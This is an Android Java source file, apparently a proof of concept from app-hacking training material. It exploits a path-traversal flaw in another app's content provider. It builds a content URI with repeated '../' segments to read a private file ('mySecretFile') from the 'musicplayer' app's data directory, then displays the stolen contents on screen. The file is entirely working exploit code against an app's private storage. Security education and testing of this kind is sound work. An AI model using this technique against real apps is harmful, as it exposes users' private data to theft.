package com.apphacking.pathtraversalpoc;

import androidx.appcompat.app.AppCompatActivity;

import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {

    InputStream inputStream;
    TextView textView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        textView = (TextView) findViewById(R.id.textView);

        Uri uri = Uri.parse("content://com.apphacking.musicplayer/../../../../../../../data/data/com.apphacking.musicplayer/files/mySecretFile");

        try {
            inputStream = getContentResolver().openInputStream(uri);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }

        InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
        String fileInput = "";

        try {

            while (bufferedReader.ready()) {
                fileInput += bufferedReader.readLine();
                fileInput += "\n";
            }

        } catch (IOException e) {
                e.printStackTrace();
            }

        textView.setText("Accessing mySecretFile: \n" + fileInput);

    }
}